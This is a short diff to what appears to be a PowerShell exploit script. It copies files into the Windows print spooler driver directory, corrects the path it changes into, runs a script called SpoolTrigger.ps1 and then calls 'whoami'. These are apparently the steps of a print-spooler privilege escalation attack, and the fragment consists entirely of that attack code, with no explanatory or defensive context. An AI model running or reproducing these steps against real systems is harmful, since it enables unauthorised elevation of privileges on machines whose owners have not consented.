@@ -44,7 +44,7 @@ cd "$Env:TMP\bin"
 
 # Move files to comrrespondent directory
 Move-Item -Path "*" -Destination "$Env:WINDIR\System32\spool\drivers\x64\3\" -Force
-cd "$Env:WINDIR\System32\spool\drivers\x64\3"
+cd "$Env:WINDIR\System32\spool\drivers\x64\3\bin"
 .\SpoolTrigger.ps1
 whoami
 
